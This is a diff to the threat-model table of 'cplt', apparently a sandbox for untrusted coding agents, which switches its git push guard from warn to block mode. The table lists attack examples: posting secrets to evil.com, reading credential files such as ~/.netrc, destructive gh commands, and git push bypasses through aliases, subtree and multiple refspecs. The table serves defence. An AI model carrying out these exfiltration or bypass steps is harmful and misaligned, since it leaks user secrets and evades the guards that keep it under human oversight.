@@ -121,7 +121,7 @@ cplt assumes the sandboxed agent is **untrusted**, because it executes arbitrary
 | **Data exfiltration** | POST secrets to `https://evil.com/collect` | Filesystem isolation (credentials unreadable) |
 | **Secret file access** | Read `~/.netrc`, `~/.npmrc`, `~/.vault-token` | Seatbelt deny rules (macOS) / Landlock deny (Linux) |
 | **Destructive GitHub ops** | `gh repo delete`, `gh pr merge`, `gh release create` | gh guard command interception (on by default) |
-| **Unreviewed code push** | `git push origin main` | git guard command interception (on by default, `warn` mode) |
+| **Unreviewed code push** | `git push origin main` | git guard command interception (on by default, `block` mode, default branch) |
 | **Git alias push bypass** | `git -c alias.p=push p origin main` | git guard blocks `-c alias.*` and denies unknown subcommands |
 | **Git subtree push bypass** | `git subtree push --prefix=lib origin main` | `subtree` in explicit block list, plus deny-unknown policy |
 | **Multi-refspec bypass** | `git push origin feature main` | git guard checks ALL refspecs, not just the first |
